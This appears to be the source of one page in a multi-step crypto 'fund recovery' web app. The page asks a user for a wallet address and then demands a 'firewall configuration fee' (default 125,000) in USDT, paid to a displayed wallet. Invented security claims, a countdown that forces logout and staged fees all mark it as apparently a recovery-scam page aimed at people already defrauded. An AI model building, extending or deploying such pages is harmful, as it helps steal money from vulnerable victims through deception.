import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Shield, Clock, ArrowRight, CheckCircle, Zap, Lock, Wallet, AlertCircle, Copy } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "../supabaseClient";

const RecoveryStep2 = () => {
  const [walletAddress, setWalletAddress] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(8 * 60 * 60); // 8 hours in seconds
  const [user, setUser] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();
  const { toast } = useToast();

  const companyWalletAddress = import.meta.env.VITE_WALLET_ADDRESS;
  const walletNetwork = import.meta.env.VITE_WALLET_NETWORK || "TRC20";


  const handleCopyWallet = async () => {
    try {
await navigator.clipboard.writeText(user.paidwallet);
      console.log("Step 1: Wallet address copied:", user.paidwallet);
      toast({
        title: "Wallet Address Copied",
        description: "The wallet address has been copied to your clipboard.",
      });
    } catch (err) {
      console.error("Step 2: Failed to copy wallet address:", err);
      toast({
        variant: "destructive",
        title: "Copy Failed",
        description: "Unable to copy wallet address. Please try again.",
      });
    }
  };

  // Fetch user data and extraction_fee2
  useEffect(() => {
    const fetchUserData = async () => {
      try {
        console.log("Step 2: Fetching user data...");
        const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();
        console.log("Step 2: Auth user:", authUser, "Auth error:", authError);
        if (authError || !authUser) {
          console.error("Step 2: Authentication failed, redirecting to /login");
          toast({
            variant: "destructive",
            title: "Authentication Error",
            description: "Please log in to continue.",
          });
          navigate("/login", { replace: true });
          return;
        }

        const { data, error } = await supabase
          .from("profiles")
          .select("step1completed, step2completed, walletaddress, extraction_fee2, paidwallet, paidwalletnetwork")
          .eq("id", authUser.id)
          .single();

        console.log("Step 2: Profile data:", data, "Profile error:", error);
        if (error) {
          if (error.code === "PGRST116") {
            console.log("Step 2: No profile found, creating one for user:", authUser.id);
            const { error: insertError } = await supabase
              .from("profiles")
              .insert({
                id: authUser.id,
                refundamount: "0",
                walletaddress: "",
                step1completed: false,
                step2completed: false,
                extraction_fee2: "",
                paidwallet: "",
                paidwalletnetwork: "",
              });
            if (insertError) {
              console.error("Step 2: Insert profile error:", insertError.message, insertError.details, insertError.hint, insertError.code);
              throw insertError;
            }
            // Retry fetching
            const { data: retryData, error: retryError } = await supabase
              .from("profiles")
              .select("step1completed, step2completed, walletaddress, extraction_fee2, paidwallet, paidwalletnetwork")
              .eq("id", authUser.id)
              .single();
            if (retryError) {
              console.error("Step 2: Retry fetch error:", retryError.message, retryError.details, retryError.hint, retryError.code);
              throw retryError;
            }
            console.log("Step 2: Profile created:", retryData);
            setUser({
              id: authUser.id,
              step1Completed: retryData.step1completed,
              step2Completed: retryData.step2completed,
              walletAddress: retryData.walletaddress,
              extractionFee: retryData.extraction_fee2,
              paidwallet: retryData.paidwallet,
              paidwalletnetwork: retryData.paidwalletnetwork,
            });
          } else {
            console.error("Step 2: Profile fetch error:", error.message, error.details, error.hint, error.code);
            throw error;
          }
        } else {
          if (data.extraction_fee2 === null) {
            console.log("Step 2: Extraction fee missing, setting default for user:", authUser.id);
            const { error: updateError } = await supabase
              .from("profiles")
              .update({ extraction_fee2: 125000 })
              .eq("id", authUser.id);
            if (updateError) {
              console.error("Step 2: Update fee error:", updateError.message, updateError.details, updateError.hint, updateError.code);
              throw updateError;
            }
            // Retry fetching
            const { data: retryData, error: retryError } = await supabase
              .from("profiles")
              .select("step1completed, step2completed, walletaddress, extraction_fee2, paidwallet, paidwalletnetwork")
              .eq("id", authUser.id)
              .single();
            if (retryError) {
              console.error("Step 2: Retry fee fetch error:", retryError.message, retryError.details, retryError.hint, retryError.code);
              throw retryError;
            }
            console.log("Step 2: Profile updated with fee:", retryData);
            setUser({
              id: authUser.id,
              step1Completed: retryData.step1completed,
              step2Completed: retryData.step2completed,
              walletAddress: retryData.walletaddress,
              extractionFee: retryData.extraction_fee2,
              paidwallet: retryData.paidwallet,
              paidwalletnetwork: retryData.paidwalletnetwork,
            });
          } else {
            console.log("Step 2: Profile loaded:", data);
            setUser({
              id: authUser.id,
              step1Completed: data.step1completed,
              step2Completed: data.step2completed,
              walletAddress: data.walletaddress,
              extractionFee: data.extraction_fee2,
              paidwallet: data.paidwallet,
              paidwalletnetwork: data.paidwalletnetwork,
            });
            setWalletAddress(data.walletaddress || "");
          }
          if (!data.step1completed) {
            console.log("Step 2: step1completed is false, redirecting to /recovery/step1");
            toast({
              variant: "destructive",
              title: "Incomplete Step",
              description: "Please complete Step 1 before proceeding.",
            });
            navigate("/recovery/step1", { replace: true });
            return;
          }
          if (data.step2completed) {
            console.log("Step 2: step2completed is true, redirecting to /recovery/step3");
            toast({
              title: "Step 2 Already Completed",
              description: "Redirecting to Step 3.",
            });
            navigate("/recovery/step3", { replace: true });
          } else {
            console.log("Step 2: step2completed is false, staying on Step 2");
          }
        }
      } catch (err: any) {
        console.error("Step 2: Error fetching user data:", err.message, err.details, err.hint, err.code);
        setError("Failed to fetch user data or fee");
        toast({
          variant: "destructive",
          title: "Error",
          description: "Unable to load user data or fee. Please try again.",
        });
        navigate("/login", { replace: true });
      }
    };

    fetchUserData();
  }, [navigate, toast]);

  // Real-time subscription for step2completed changes
  useEffect(() => {
    if (!user?.id) {
      console.log("Step 2: No user ID, skipping real-time subscription");
      return;
    }

    console.log("Step 2: Setting up real-time subscription for user:", user.id);
    const subscription = supabase
      .channel(`profiles-changes-${user.id}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "profiles",
          filter: `id=eq.${user.id}`,
        },
        (payload) => {
          console.log("Step 2: Realtime payload:", payload);
          if (payload.new.step2completed) {
            console.log("Step 2: step2completed updated to true, redirecting to /recovery/step3");
            toast({
              title: "Step 2 Completed",
              description: "Payment confirmed. Redirecting to Step 3.",
            });
            navigate("/recovery/step3", { replace: true });
          }
        }
      )
      .subscribe((status, err) => {
        console.log("Step 2: Subscription status:", status, "Error:", err);
        if (status === "SUBSCRIBED") {
          console.log("Step 2: Realtime subscription active for user:", user.id);
        } else if (err) {
          console.error("Step 2: Realtime subscription error:", err);
          toast({
            variant: "destructive",
            title: "Realtime Error",
            description: "Unable to connect to real-time updates. Please proceed manually.",
          });
        }
      });

    return () => {
      console.log("Step 2: Cleaning up subscription for user:", user.id);
      supabase.removeChannel(subscription);
    };
  }, [user?.id, navigate, toast]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          console.log("Step 2: Timer expired, signing out and redirecting to /login");
          supabase.auth.signOut();
          navigate("/login", { replace: true });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [navigate]);

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const handlePayment = async () => {
    if (!walletAddress) {
      console.log("Step 2: Wallet address missing");
      toast({
        variant: "destructive",
        title: "Wallet Address Required",
        description: "Please enter your wallet address to proceed.",
      });
      return;
    }

    if (!user?.extractionFee) {
      console.error("Step 2: Extraction fee missing for user:", user?.id);
      toast({
        variant: "destructive",
        title: "Fee Not Set",
        description: "Extraction fee is not set. Please contact support.",
      });
      return;
    }

    setIsLoading(true);

    try {
      console.log("Step 2: Updating profile for user:", user.id, "with wallet:", walletAddress);
      const { data, error } = await supabase
        .from("profiles")
        .update({ walletaddress: walletAddress, step2completed: true })
        .eq("id", user.id)
        .select("walletaddress, step2completed")
        .single();

      if (error) {
        console.error("Step 2: Update profile error:", error.message, error.details, error.hint, error.code);
        throw error;
      }

      console.log("Step 2: Profile updated successfully:", data);
      toast({
        title: "Payment Submitted",
        description: "Firewall configuration fee payment recorded. Redirecting to Step 3.",
      });
      navigate("/recovery/step3", { replace: true });
    } catch (err: any) {
      console.error("Step 2: Error updating profile:", err.message, err.details, err.hint, err.code);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to process payment. Please copy and make payment to the wallet provided.",
      });
    } finally {
      setIsLoading(false);
      console.log("Step 2: isLoading set to false");
    }
  };

  if (error) {
    console.log("Step 2: Rendering error:", error);
    return <div>Error: {error}</div>;
  }
  if (!user || user.extractionFee === null) {
    console.log("Step 2: Rendering loading state, user:", user);
    return <div>Loading...</div>;
  }

  console.log("Step 2: Rendering component, user:", user);
  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-crypto-dark to-crypto-darker">
      <header className="border-b border-border/50 bg-card/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Shield className="h-8 w-8 text-primary" />
              <div>
                <h1 className="text-xl font-bold text-foreground">KODAKTECHIE RECOVERY</h1>
                <p className="text-sm text-primary">Step 2 of 3: Firewall Configuration</p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Clock className="h-5 w-5 text-orange-500" />
              <span className="text-sm font-mono text-orange-500">{formatTime(timeLeft)}</span>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto space-y-8">
          <div className="space-y-2">
            <div className="flex justify-between text-sm">
              <span className="text-foreground">Recovery Progress</span>
              <span className="text-primary">Step 2 of 3</span>
            </div>
            <Progress value={66} className="h-2" />
            <div className="flex justify-between text-xs text-muted-foreground">
              <span className="text-primary">✓ Extraction</span>
              <span className="text-primary">Firewall</span>
              <span>Final Unlock</span>
            </div>
          </div>

          <Card className="bg-primary/10 border-primary/30">
            <CardContent className="pt-6">
              <div className="flex items-center gap-3">
                <CheckCircle className="h-6 w-6 text-primary" />
                <div>
                  <h3 className="font-semibold text-primary">Step 1 Completed Successfully</h3>
                  <p className="text-sm text-foreground">Wallet verification and extraction fee processed</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-card/90 backdrop-blur-sm border-primary/20 shadow-xl">
            <CardHeader className="text-center">
              <div className="flex justify-center mb-4">
                <div className="p-4 rounded-full bg-primary/20 border border-primary/30">
                  <Shield className="h-12 w-12 text-primary" />
                </div>
              </div>
              <CardTitle className="text-2xl">Security Firewall Configuration</CardTitle>
              <CardDescription>Advanced malware protection and security hardening</CardDescription>
            </CardHeader>

            <CardContent className="space-y-6">
              <div className="flex items-start gap-3 p-4 rounded-lg bg-orange-500/10 border border-orange-500/20">
                <AlertCircle className="h-5 w-5 text-orange-500 mt-0.5" />
                <div className="text-sm">
                  <p className="font-medium text-orange-500 mb-1">Time-Sensitive Process</p>
                  <p className="text-foreground">
                    Complete this step within the allocated time to maintain session security and prevent auto-lock.
                  </p>
                </div>
              </div>

              <div className="space-y-3">
                <Label htmlFor="wallet" className="text-base font-medium">
                  Your Cryptocurrency Wallet Address
                </Label>
                <Input
                  id="wallet"
                  placeholder="Enter your wallet address (BTC, ETH, USDT, etc.)"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  className="bg-input border-border/50 focus:border-primary h-12"
                />
                <p className="text-xs text-muted-foreground">
                  Confirm your wallet address for the firewall configuration process.
                </p>
              </div>

              <div className="grid gap-4">
                <div className="flex items-center gap-3 p-3 rounded-lg bg-secondary/50">
                  <Lock className="h-5 w-5 text-primary" />
                  <div>
                    <h4 className="font-medium text-foreground">Anti-Malware Scanning</h4>
                    <p className="text-sm text-muted-foreground">Detect and eliminate threats</p>
                  </div>
                </div>
                <div className="flex items-center gap-3 p-3 rounded-lg bg-secondary/50">
                  <Zap className="h-5 w-5 text-primary" />
                  <div>
                    <h4 className="font-medium text-foreground">Firewall Hardening</h4>
                    <p className="text-sm text-muted-foreground">Block unauthorized access attempts</p>
                  </div>
                </div>
                <div className="flex items-center gap-3 p-3 rounded-lg bg-secondary/50">
                  <Shield className="h-5 w-5 text-primary" />
                  <div>
                    <h4 className="font-medium text-foreground">Secure Channel Creation</h4>
                    <p className="text-sm text-muted-foreground">Encrypted communication pathway</p>
                  </div>
                </div>
              </div>

              <Card className="bg-orange-500/10 border-orange-500/30">
                <CardContent className="pt-4">
                  <h3 className="font-semibold text-orange-500 mb-2">Critical Security Step</h3>
                  <p className="text-sm text-foreground">
                    Security Firewall Configuration is required to secure your refund and eliminate 
                    malware that could alert scammers to your recovery process. This step ensures 
                    your funds remain protected during the final transfer phase.
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-secondary/50 border-border/30">
                <CardContent className="pt-6">
                  <div className="text-center space-y-4">
                    <h3 className="font-semibold text-foreground">Firewall Configuration Fee</h3>
                    <div className="space-y-2">
                      <p className="text-3xl font-bold text-primary">
                        ${user.extractionFee.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </p>
                      <p className="text-sm text-muted-foreground">Advanced security implementation (USDT)</p>
                    </div>
                    <div className="text-sm space-y-1">
                      <p className="text-foreground">This fee covers:</p>
                      <ul className="text-muted-foreground space-y-1">
                        <li>• Advanced firewall configuration</li>
                        <li>• Real-time malware scanning</li>
                        <li>• Secure communication protocols</li>
                        <li>• Anti-scammer protection systems</li>
                      </ul>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-secondary/50 border-border/30">
                <CardContent className="pt-6">
                  <div className="text-center space-y-4">
                    <h3 className="font-semibold text-foreground">Make Your Firewall Configuration Payment</h3>
                    <div className="space-y-2">
                      <p className="text-lg text-foreground">
                        Send ${user.extractionFee.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ({user.paidwalletnetwork}) to this wallet address:
                      </p>
                      <p className="text-sm text-muted-foreground break-all">
                        Wallet Address: {user.paidwallet}
                      </p>
                      <Button onClick={handleCopyWallet} size="sm" className="mt-2">
                        <Copy className="h-4 w-4 mr-2" />
                        Copy Wallet Address
                      </Button>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <div className="flex flex-wrap gap-2 justify-center">
                <Badge className="bg-primary/20 text-primary border-primary/30">Military-Grade Security</Badge>
                <Badge className="bg-primary/20 text-primary border-primary/30">Real-time Protection</Badge>
                <Badge className="bg-primary/20 text-primary border-primary/30">Zero-Trust Architecture</Badge>
              </div>

              <Button
                onClick={handlePayment}
                size="lg"
                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold py-3"
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="h-5 w-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
                    Processing Payment...
                  </div>
                ) : (
                  <>
                    Confirm Payment & Continue
                    <ArrowRight className="ml-2 h-5 w-5" />
                  </>
                )}
              </Button>

              <p className="text-xs text-center text-muted-foreground">
                After sending the payment to the wallet address above, click "Confirm Payment & Continue" to proceed. By proceeding, you agree to the terms of service and acknowledge that this is a secure transaction processed through our encrypted payment gateway.
              </p>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default RecoveryStep2;